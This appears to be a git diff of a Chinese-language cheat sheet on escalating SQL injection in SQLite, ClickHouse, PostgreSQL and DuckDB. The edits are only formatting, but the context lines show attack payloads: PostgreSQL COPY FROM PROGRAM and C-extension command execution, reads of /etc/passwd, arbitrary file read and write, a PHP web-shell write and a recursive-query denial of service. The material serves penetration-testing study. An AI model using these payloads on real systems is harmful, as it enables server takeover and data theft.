@@ -6,8 +6,6 @@ tags:
   - sql2other
 ---
 
-## Table of contents
-
 ## sink
 execute, executemany
 executescript(sqlite)
@@ -91,7 +89,7 @@ SELECT repeat('A', 10000) FROM numbers(1000000);
 
 ### 写文件
 
-```Python
+```python
 import sqlite3
 
 db = sqlite3.connect("test.db")
@@ -105,7 +103,7 @@ db.commit()
 
 ### DOS
 利用CTE递归+笛卡尔积（并行），仅fetchall时可用
-```SQL
+```sql
 WITH RECURSIVE test(x) AS (
     SELECT 1 UNION ALL SELECT x + 1 FROM test WHERE x < 1000
 )
@@ -143,7 +141,7 @@ docker run -d   --name my_postgres   -e POSTGRES_PASSWORD=pass  -p 5432:5432   -
 postgres>=9.3
 superuser权限
 
-```SQL
+```sql
 DROP TABLE IF EXISTS log;
 CREATE TABLE log(content text);
 COPY log(content) FROM PROGRAM 'id';
@@ -179,7 +177,7 @@ SELECT system('cat /etc/passwd');
 
 以后，需要上传带PG_MODULE_MAGIC的so文件
 
-```C
+```c
 #include "postgres.h"
 #include "fmgr.h"
 #include "utils/builtins.h"
@@ -225,7 +223,7 @@ testf(PG_FUNCTION_ARGS)
 
 编译，头文件版本必须和目标一样
 
-```Bash
+```bash
 gcc -Wall -I/usr/include/postgresql/16/server -Os -shared testp.c -fPIC -o testp.so
 ```
 
@@ -242,13 +240,13 @@ CREATE FUNCTION testf(command text) RETURNS text
 
 执行命令
 
-```Bash
+```bash
 select testf('cat /etc/passwd');
 ```
 
 从.so文件到sql语句的脚本
 
-```Python
+```python
 #!/usr/bin/env python3
 # -*- coding:utf-8 -*-
 
@@ -295,7 +293,7 @@ if __name__ == "__main__":
 
 读取，需要pg_read_server_files权限
 
-```SQL
+```sql
 create table test(data text);
 copy test(data) from '/etc/passwd' with delimiter E'\x7f';
 select * from test;
@@ -303,7 +301,7 @@ select * from test;
 
 写入，需要pg_write_server_files权限
 
-```SQL
+```sql
 copy (select 'abc') to '/tmp/abc.txt'; 
 ```
 
@@ -311,7 +309,7 @@ copy (select 'abc') to '/tmp/abc.txt';
 
 需要管理员权限
 
-```SQL
+```sql
 select pg_read_file('/tmp/abc.txt');
 select pg_ls_dir('/');
 -- write需要加载adminpack插件
@@ -325,14 +323,14 @@ SELECT pg_file_write('/tmp/example.txt', 'Hello', true);
 
 读
 
-```SQL
+```sql
 select lo_import('/tmp/abc.txt', 2222);
 select lo_get(2222);
 ```
 
 写
 
-```SQL
+```sql
 select lo_from_bytea(3333, decode('aGVsbG8=','base64'));
 select lo_from_bytea(9999, lo_get(3333) || lo_get(3333)); -- 可以拼接多个
 select lo_export(9999,'/tmp/res');
@@ -412,7 +410,7 @@ FROM generate_series(1, 1000) t1,
 
 ### 写文件
 
-```Bash
+```bash
 COPY (SELECT 'abc') TO '/tmp/res' WITH (HEADER false);
 ```
 或通过attach（退出前内容在testdb.wal）
@@ -425,7 +423,7 @@ insert into db.testtb values('<?=system("ls");?>');
 ### 读文件
 
 read_csv或read_text
-```SQL
+```sql
 SELECT * FROM read_csv('/etc/passwd');
 ```
 或使用copy from
